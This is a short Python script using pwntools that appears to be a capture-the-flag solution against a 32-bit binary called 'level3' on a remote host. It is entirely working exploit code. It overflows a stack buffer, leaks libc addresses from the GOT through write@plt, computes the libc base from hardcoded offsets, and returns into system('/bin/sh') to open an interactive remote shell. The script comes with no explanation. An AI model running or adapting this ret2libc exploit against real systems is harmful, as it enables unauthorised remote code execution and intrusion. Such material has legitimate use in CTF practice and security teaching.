from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('111.198.29.45', 32466)
elf = ELF('./level3')
addr_bss = elf.bss()
plt_read = elf.symbols['read']
plt_write = elf.symbols['write']
got_start = elf.got['__libc_start_main']
got_read = elf.got['read']
addr_ret = 0x0804844B

#payload = fit({0x88 + 0x4:[p32(plt_read),p32(addr_ret),p32(0),p32(addr_bss),p32(0x10)]})
payload = fit({0x88 + 0x4:[p32(plt_write),p32(addr_ret),p32(1),p32(got_start),p32(0x4)]})
t.sendlineafter('Input:',payload)
t.recvline()
libc_start_main = u32(t.recv(4))
log.info(hex(libc_start_main))
payload = fit({0x88 + 0x4:[p32(plt_write),p32(addr_ret),p32(1),p32(got_read),p32(0x4)]})
t.sendlineafter('Input:',payload)
t.recvline()
addr_read = u32(t.recv(4))
log.info(hex(addr_read))
libc_base = libc_start_main - 0x018540
addr_sys = libc_base + 0x03a940
binsh = libc_base + 0x15902b
payload = fit({0x88 + 0x4:[p32(addr_sys),p32(0),p32(binsh)]})
t.sendlineafter('Input:',payload)


t.interactive()

